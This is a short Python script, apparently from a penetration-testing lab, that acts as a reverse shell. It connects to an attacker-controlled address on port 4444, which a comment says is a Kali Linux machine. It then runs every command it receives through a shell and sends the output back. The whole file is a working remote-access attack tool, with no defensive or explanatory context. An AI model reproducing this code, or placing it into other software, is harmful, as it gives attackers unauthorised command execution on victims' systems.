#!/usr/bin/python

import subprocess
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("10.0.0.67", 4444))  # first parameter is IP address of your kali linux machine


while True:
	command = sock.recv(2048)
	if command == "q":
		break
	else:
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		result = proc.stdout.read() + proc.stderr.read()
		sock.send(result)

sock.close()
